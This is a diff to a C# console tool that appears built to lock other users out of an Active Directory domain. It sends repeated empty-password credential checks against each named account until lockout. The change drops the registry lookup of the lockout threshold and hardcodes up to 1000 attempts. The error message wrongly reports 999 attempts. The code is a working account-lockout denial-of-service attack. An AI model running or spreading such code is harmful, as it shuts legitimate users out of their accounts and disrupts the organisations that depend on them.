@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.DirectoryServices.AccountManagement;
 using System.DirectoryServices.ActiveDirectory;
 
@@ -11,12 +10,6 @@ class Program
 
         var domain = LoadDomain();
         if (domain == null)
-        {
-            return;
-        }
-
-        var accountLockoutInformation = LoadAccountLockoutInformation();
-        if (accountLockoutInformation == null)
         {
             return;
         }
@@ -40,7 +33,7 @@ class Program
                         continue;
                     }
 
-                    BlockUser(context, principal, username, accountLockoutInformation);
+                    AttemptToBlockUser(context, principal, username);
                 }
             }
         }
@@ -63,39 +56,6 @@ class Program
             Console.Read();
         }
         return null;
-    }
-
-    private static Tuple<int, int> LoadAccountLockoutInformation()
-    {
-        int maxDenials, lockoutDurationMinutes;
-
-        try
-        {
-            using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\RemoteAccess\Parameters\AccountLockout"))
-            {
-                maxDenials = (int)key.GetValue("MaxDenials");
-                lockoutDurationMinutes = (int)key.GetValue("ResetTime (mins)");
-
-                key.Close();
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Unable to read registry!");
-            Console.WriteLine("({0}: {1})", ex.GetType(), ex.Message);
-            Console.Read();
-            return null;
-        }
-
-        if (maxDenials == 0)
-        {
-            Console.WriteLine("The system administrator has disabled account blocking after failing multiple authentication attempts!");
-            Console.WriteLine("Note that because of that, the network might be vulnerable to easy password cracking using brute force.");
-            Console.Read();
-            return null;
-        }
-
-        return new Tuple<int, int>(maxDenials, lockoutDurationMinutes);
     }
 
     private static PrincipalContext LoadContext(string domain)
@@ -136,35 +96,26 @@ class Program
         return null;
     }
 
-    private static bool BlockUser(PrincipalContext context, UserPrincipal principal, string username, Tuple<int, int> accountLockoutInformation)
+    private static void AttemptToBlockUser(PrincipalContext context, UserPrincipal principal, string username)
     {
-        var maxDenials = accountLockoutInformation.Item1;
-        var lockoutDurationMinutes = accountLockoutInformation.Item2;
-
         if (principal.IsAccountLockedOut())
         {
             Console.WriteLine($"\"{username}\" is already blocked!");
-            return false;
+            return;
         }
 
-        for (int i = 0; i < maxDenials && !principal.IsAccountLockedOut(); i++)
+        for (int i = 0; i < 1000 && !principal.IsAccountLockedOut(); i++)
         {
             context.ValidateCredentials(username, string.Empty);
         }
 
         if (principal.IsAccountLockedOut())
         {
-            var lockoutTimeString = lockoutDurationMinutes == 0 ?
-                "until an administrator unblocks him" :
-                $"for {lockoutDurationMinutes} minutes";
-
-            Console.WriteLine($"\"{username}\" has been successfully blocked {lockoutTimeString}!\n");
-            return true;
+            Console.WriteLine($"\"{username}\" has been successfully blocked!\n");
         }
         else
         {
-            Console.WriteLine($"Error: \"{username}\" can't be blocked after {maxDenials} attempts!\n");
-            return false;
+            Console.WriteLine($"Error: \"{username}\" can't be blocked after 999 attempts!\n");
         }
     }
 }
